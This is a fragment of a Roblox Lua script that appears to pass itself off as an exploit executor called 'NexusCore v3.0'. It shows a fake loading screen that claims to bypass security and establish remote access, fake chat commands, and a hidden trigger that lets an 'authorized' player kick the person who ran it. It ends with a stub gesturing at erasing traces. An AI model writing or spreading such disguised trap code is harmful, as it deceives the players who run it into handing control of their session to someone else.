screenGui.Parent = game:GetService("CoreGui")

-- Fake loading animation
task.spawn(function()
    local messages = {
        "Initializing runtime...",
        "Loading LuaVM...",
        "Injecting hooks...",
        "Bypassing security...",
        "Loading modules...",
        "Establishing remote access...",
        "Finalizing setup..."
    }
    
    for i = 1, 100 do
        if i <= 15 then status.Text = messages[1]
        elseif i <= 30 then status.Text = messages[2]
        elseif i <= 40 then status.Text = messages[3]
        elseif i <= 50 then status.Text = messages[4]
        elseif i <= 70 then status.Text = messages[5]
        elseif i <= 90 then status.Text = messages[6]
        else status.Text = messages[7] end
        
        progressFill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Quad", 0.1, true)
        task.wait(0.08)
    end
    
    -- Success countdown
    for i = 3, 1, -1 do
        status.Text = "Loaded! Closing in " .. i .. "s"
        task.wait(1)
    end
    
    -- Remove UI smoothly
    frame:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Quad", 0.5, true)
    task.wait(0.5)
    pcall(function() screenGui:Destroy() end)
    
    -- Fake success messages (looks legit)
    warn("âœ… NexusCore v3.0 successfully loaded!")
    warn("ðŸ”§ Type '.cmds' for available commands")
    warn("ðŸ”’ Anti-detection: ACTIVE")
end)

-- The real troll begins after loading
task.delay(5, function()
    -- Add fake command system (to distract him)
    local function handleChat(msg, player)
        local cmd = string.lower(msg)
        
        -- Fake commands (do nothing)
        if cmd == ".cmds" then
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Available commands: .fly, .invis, .killall, .troll, .k (admin)";
                Color = Color3.new(0.5, 0.8, 1);
                FontSize = 18;
            })
        elseif cmd:sub(1, 5) == ".fly" then
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Fly mode activated! (Not really lol)";
                Color = Color3.new(0, 1, 0);
                FontSize = 16;
            })
        elseif cmd:sub(1, 6) == ".invis" then
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "You are now invisible to NPCs! (Psych!)";
                Color = Color3.new(0, 1, 0);
                FontSize = 16;
            })
        end
        
        -- REAL TRAP: If authorized user types ".k"
        if cmd == ".k" and isAuthorized(player.Name) then
            task.delay(0.1, function()
                -- Kick with funny message
                game.Players.LocalPlayer:Kick("ðŸ’¥ BOOM! You got trolled by " .. player.Name .. "! This script self-destructs now...")
                
                -- Try to clean up (self-destruct)
                task.delay(0.5, function()
                    pcall(function()
                        -- Attempt to clear any logs or traces
                        for _, v in pairs(getgc(true)) do
                            if type(v) == "function" then
                                -- This won't actually do much but looks cool
                            end
                        end
                    end)
                end)
            end)
        end
    end

    -- Monitor all players
    game.Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(msg)
            handleChat(msg, player)
        end)
    end)

    -- Check existing players
    for _, player in ipairs(game.Players:GetPlayers()) do
        player.Chatted:Connect(function(msg)
            handleChat(msg, player)
        end)
    end
end)
